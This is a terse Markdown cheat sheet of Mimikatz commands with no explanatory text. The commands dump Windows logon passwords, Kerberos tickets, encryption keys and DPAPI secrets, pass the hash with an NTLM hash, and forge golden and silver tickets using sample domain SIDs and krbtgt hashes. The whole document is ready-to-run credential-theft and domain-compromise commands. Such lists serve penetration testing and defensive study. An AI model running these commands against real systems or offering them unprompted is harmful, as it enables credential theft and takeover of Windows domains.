# Mimikatz

Enable debug privileges

```
privilege::debug
```

## sekurlsa

```
sekurlsa::logonpasswords
```



```
sekurlsa::logonPasswords full
```



```
sekurlsa::tickets /export
```



```
sekurlsa::pth /user:Administrateur /domain:winxp /ntlm:f193d757b4d487ab7e5a3743f038f713 /run:cmd
```

&#x20;

## kerberos

```
kerberos::list /export
```



```
kerberos::ptt c:\chocolate.kirbi
```



```
kerberos::golden /admin:administrateur /domain:chocolate.local /sid:S-1-5-21-130452501-2365100805-3685010670 /krbtgt:310b643c5316c8c3c70a10cfb17e2e31 /ticket:chocolate.kirbi
```

### TGT



```
kerberos
```

## ekeys



```
sekurlsa::ekeys
```

## DPAPI



```
sekurlsa::dpapi
```

## Silver / Golden Ticket



```
kerberos::golden /user:utilisateur /domain:chocolate.local /sid:S-1-5-21-130452501-2365100805-3685010670 /krbtgt:310b643c5316c8c3c70a10cfb17e2e31 /id:1107 /groups:513 /ticket:utilisateur.chocolate.kirbi
```



```
kerberos::golden /domain:chocolate.local /sid:S-1-5-21-130452501-2365100805-3685010670 /aes256:15540cac73e94028231ef86631bc47bd5c827847ade468d6f6f739eb00c68e42 /user:Administrateur /id:500 /groups:513,512,520,518,519 /ptt /startoffset:-10 /endin:600 /renewmax:10080
```



```
kerberos::golden /admin:Administrator /domain:CTU.DOMAIN /sid:S-1-1-12-123456789-1234567890-123456789 /krbtgt:deadbeefboobbabe003133700009999 /ticket:Administrator.kiribi 
```
